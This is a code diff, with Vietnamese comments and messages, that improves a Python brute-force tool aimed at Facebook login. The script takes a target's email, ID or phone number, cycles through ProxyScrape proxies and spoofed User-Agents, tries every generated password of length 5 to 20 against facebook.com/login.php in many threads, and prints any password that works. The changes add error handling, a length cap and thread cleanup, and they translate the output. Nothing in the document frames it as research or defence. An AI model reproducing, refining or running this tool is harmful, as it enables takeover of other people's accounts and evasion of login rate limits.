@@ -16,8 +16,14 @@ result_queue = queue.Queue()
 login_url = "https://www.facebook.com/login.php"
 
 # Đọc danh sách User-Agent từ tệp JSON
-with open('user_agents.json', 'r') as file:
-    user_agents = json.load(file)
+try:
+    with open('user_agents.json', 'r') as file:
+        user_agents = json.load(file)
+    if not user_agents:
+        raise ValueError("Danh sách user_agents trống!")
+except (FileNotFoundError, json.JSONDecodeError, ValueError) as e:
+    print(f"Lỗi khi đọc file user_agents.json: {str(e)}")
+    user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]
 
 # Hàm lấy proxy từ ProxyScrape
 def get_proxies():
@@ -56,9 +62,9 @@ def login(target, password, proxy=None):
         return -1  # Lỗi trong quá trình gửi yêu cầu
 
 # Hàm sinh mật khẩu
-def password_generator():
+def password_generator(max_length=20):
     length = 5
-    while True:
+    while length <= max_length:
         for password in itertools.product(characters, repeat=length):
             password_queue.put(''.join(password))
         length += 1
@@ -68,15 +74,16 @@ def worker(target, proxies):
     while True:
         password = password_queue.get()
         if password is None:
+            password_queue.task_done()
             break
         proxy = random.choice(proxies) if proxies else None
-        print(f"Trying password: {password} with proxy: {proxy}")
+        print(f"Thử mật khẩu: {password} với proxy: {proxy}")
         result = login(target, password, proxy)
         if result == 1:
-            result_queue.put(f"[+] Success! Password: {password}")
+            result_queue.put(f"[+] Thành công! Mật khẩu: {password}")
             break
         elif result == 2:
-            result_queue.put(f"[!] Account locked with 2-factor authentication. Password was: {password}")
+            result_queue.put(f"[!] Tài khoản bị khóa với xác minh 2 lớp. Mật khẩu là: {password}")
             break
         password_queue.task_done()
 
@@ -86,6 +93,9 @@ def Main(target):
 
     # Lấy danh sách proxy
     proxies = get_proxies()
+    if not proxies:
+        print("Không có proxy. Đang thoát...")
+        return
 
     # Tạo luồng thử mật khẩu
     threads = []
@@ -96,12 +106,12 @@ def Main(target):
         threads.append(t)
 
     # Tạo luồng sinh mật khẩu
-    pw_gen_thread = threading.Thread(target=password_generator)
+    pw_gen_thread = threading.Thread(target=lambda: password_generator(max_length=20))
     pw_gen_thread.daemon = True
     pw_gen_thread.start()
 
-    # Đợi cho tới khi tìm được mật khẩu hoặc có kết quả
-    while result_queue.empty():
+    # Đợi kết quả hoặc kết thúc
+    while result_queue.empty() and any(t.is_alive() for t in threads):
         threading.Event().wait(1)
 
     # Hiển thị kết quả
@@ -109,10 +119,16 @@ def Main(target):
         result = result_queue.get()
         print(result)
 
-    # Dừng các luồng
+    # Dừng các luồng làm việc
     for _ in range(num_threads):
         password_queue.put(None)
 
+    # Đảm bảo tất cả các luồng đã hoàn thành
+    for t in threads:
+        t.join()
+
+    pw_gen_thread.join()
+
 if __name__ == "__main__":
-    target = input("Enter the target's email, ID, or phone number: ")
+    target = input("Nhập email, ID hoặc số điện thoại của mục tiêu: ")
     Main(target)
